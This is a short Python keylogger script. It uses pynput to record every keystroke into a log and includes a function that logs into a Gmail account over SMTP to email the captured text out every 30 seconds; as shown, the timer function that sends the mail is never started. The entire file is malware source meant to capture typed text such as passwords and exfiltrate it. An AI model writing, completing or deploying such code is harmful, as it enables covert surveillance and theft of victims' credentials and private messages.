import pynput.keyboard
import smtplib
import threading

log = ""


def callback_function(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        elif key == key.enter:
            log = log + "\n"
        else:
            log = log + str(key)
    except:
        pass

    print(log)


def send_email(email, password, text):
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email, email, text)
    email_server.quit()


def thread():
    global log
    send_email("email_address@gmail.com", "password", log.encode('utf-8'))
    #have to add email address and it's password and also must activate third party on gmail account to recieve mails
    log = ""
    timer_object = threading.Timer(30, thread)
    timer_object.start()


keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

with keylogger_listener:
    keylogger_listener.join()
